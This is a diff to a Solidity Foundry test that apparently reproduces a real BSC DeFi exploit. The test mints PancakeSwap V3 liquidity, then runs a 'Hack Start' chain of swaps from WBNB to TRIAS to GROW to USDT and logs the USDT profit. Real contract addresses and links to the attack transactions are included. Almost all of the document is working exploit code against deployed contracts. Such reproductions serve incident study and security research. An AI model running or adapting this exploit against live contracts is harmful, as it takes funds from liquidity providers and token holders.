@@ -19,7 +19,7 @@ interface Pan_Pool_V3 {
     ) external returns (int256 amount0, int256 amount1);
 }
 
-interface Pan_Router_V3 {
+interface Nonfungible_Position_Manager_V3 {
     struct MintParams {
         address token0;
         address token1;
@@ -55,6 +55,26 @@ interface Pan_Router_V3 {
         );
 }
 
+interface Pan_Router_V3 {
+    struct ExactInputSingleParams {
+        address tokenIn;
+        address tokenOut;
+        uint24 fee;
+        address recipient;
+        uint256 deadline;
+        uint256 amountIn;
+        uint256 amountOutMinimum;
+        uint160 sqrtPriceLimitX96;
+    }
+
+    /// @notice Swaps `amountIn` of one token for as much as possible of another token
+    /// @param params The parameters necessary for the swap, encoded as `ExactInputSingleParams` in calldata
+    /// @return amountOut The amount of the received token
+    function exactInputSingle(
+        ExactInputSingleParams calldata params
+    ) external payable returns (uint256 amountOut);
+}
+
 interface GDSToken is IERC20 {
     function pureUsdtToToken(uint256 _uAmount) external returns (uint256);
 
@@ -79,8 +99,17 @@ contract ContractTest is DSTest {
 
     Uni_Router_V2 V2Router =
         Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+
     Pan_Router_V3 V3Router =
-        Pan_Router_V3(0x46A15B0b27311cedF172AB29E4f4766fbE7F4364);
+        Pan_Router_V3(0x1b81D678ffb9C0263b24A97847620C99d213eB14);
+
+    Pan_Pool_V3 V3Pool =
+        Pan_Pool_V3(0x1DA3D00A2268B214968BF5f3AFa866fc2dEBd20f);
+
+    Nonfungible_Position_Manager_V3 V3Manager =
+        Nonfungible_Position_Manager_V3(
+            0x46A15B0b27311cedF172AB29E4f4766fbE7F4364
+        );
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
@@ -132,12 +161,10 @@ contract ContractTest is DSTest {
         receiver.call{value: 10 ether}("");
 
         WBNBToUSDT(20 ether);
-        USDT.approve(address(V3Router), type(uint256).max);
+        USDT.approve(address(V3Manager), type(uint256).max);
 
-        console.log("add liquidity:");
-
-        V3Router.mint(
-            Pan_Router_V3.MintParams(
+        V3Manager.mint(
+            Nonfungible_Position_Manager_V3.MintParams(
                 growAddress,
                 usdtAddress,
                 2500,
@@ -147,12 +174,13 @@ contract ContractTest is DSTest {
                 4993384272821950249644,
                 0,
                 4986366882675293290834,
-                0x5cB7ed756583AA6A9849Cb98126E25258186Ae5c,
+                address(this),
                 1709440935
             )
         );
 
         console.log("after add:");
+
         console.log(
             "GROW balance:",
             GROW.balanceOf(grow_usdt_poolAddress) / 1 ether
@@ -162,10 +190,18 @@ contract ContractTest is DSTest {
             USDT.balanceOf(grow_usdt_poolAddress) / 1 ether
         );
 
+        uint256 beforeHackUsdt = USDT.balanceOf(address(this));
+
+        console.log("Hack Start:");
         WBNBToTrias(1);
-        console.log("TRIAS Balance:", TRIAS.balanceOf(address(this)));
-        TriasToGrow(25);
-        console.log("GROW Balance:", GROW.balanceOf(address(this)));
+        TriasToGrow(TRIAS.balanceOf(address(this)));
+        GrowToUsdt(GROW.balanceOf(address(this)));
+
+        uint256 afterHackUsdt = USDT.balanceOf(address(this));
+        console.log(
+            "USDT Balance Add:",
+            (afterHackUsdt - beforeHackUsdt) / 1 ether
+        );
     }
 
     function WBNBToUSDT(uint256 amount) internal {
@@ -197,17 +233,51 @@ contract ContractTest is DSTest {
     }
     function TriasToGrow(uint256 amount) internal {
         TRIAS.approve(address(V3Router), type(uint256).max);
-        bytes[] memory metadata = abi.encodeWithSignature("swap(address,bool,int256,uint160,bytes)", _num);
-        address[] memory path = new address[](2);
-        path[0] = address(TRIAS);
-        path[1] = address(GROW);
-        V2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amount,
-            0,
-            path,
-            address(this),
-            block.timestamp
-        );
+
+        Pan_Router_V3.ExactInputSingleParams memory params = Pan_Router_V3
+            .ExactInputSingleParams({
+                tokenIn: triasAddress,
+                tokenOut: growAddress,
+                fee: 2500,
+                recipient: address(this),
+                deadline: block.timestamp,
+                amountIn: amount,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            });
+
+        V3Router.exactInputSingle(params);
+
+        // bytes[] memory metadata = abi.encodeWithSignature("swap(address,bool,int256,uint160,bytes)", _num);
+        // address[] memory path = new address[](2);
+        // path[0] = address(TRIAS);
+        // path[1] = address(GROW);
+        // V2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        //     amount,
+        //     0,
+        //     path,
+        //     address(this),
+        //     block.timestamp
+        // );
+    }
+
+    function GrowToUsdt(uint256 amount) internal {
+        GROW.approve(address(V3Router), type(uint256).max);
+
+        Pan_Router_V3.ExactInputSingleParams memory params = Pan_Router_V3
+            .ExactInputSingleParams({
+                tokenIn: growAddress,
+                tokenOut: usdtAddress,
+                fee: 2500,
+                recipient: address(this),
+                deadline: block.timestamp,
+                amountIn: amount,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            });
+
+        uint256 result = V3Router.exactInputSingle(params);
+        console.log("result:", result);
     }
 }
 
@@ -221,4 +291,9 @@ PancakeV3Pool: 0x1DA3D00A2268B214968BF5f3AFa866fc2dEBd20f
 Factory: 0x0BFbCF9fa4f9C56B0F40a671Ad40E0805A091865
 fee: 2500
 
+add liquidity: https://bscscan.com/tx/0x642e2f865e090b920ffc12763039948bdc93a68a9f5f5a0be7a8a88054f0c3d8
+
+attack: https://bscscan.com/tx/0x2f30dc78fc7c4f708d296f6733aee039bce58de0a3a39c49a21d9577c5779e59
+
+blocksec: https://app.blocksec.com/explorer/tx/bsc/0x2f30dc78fc7c4f708d296f6733aee039bce58de0a3a39c49a21d9577c5779e59
 */
